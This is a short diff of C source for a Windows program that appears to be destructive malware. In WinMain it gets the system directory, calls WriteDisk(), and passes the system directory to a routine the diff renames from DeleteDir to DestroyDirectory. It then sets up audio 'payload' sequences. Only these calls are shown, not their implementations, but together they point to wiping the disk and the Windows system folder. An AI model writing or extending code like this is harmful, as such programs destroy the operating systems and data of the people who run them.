@@ -29,7 +29,7 @@ int WinMain(
 	GetSystemDirectory(szSystemDirectory, MAX_PATH);
 
 	WriteDisk();
-	DeleteDir(szSystemDirectory);
+	DestroyDirectory(szSystemDirectory);
 
 	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
 	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
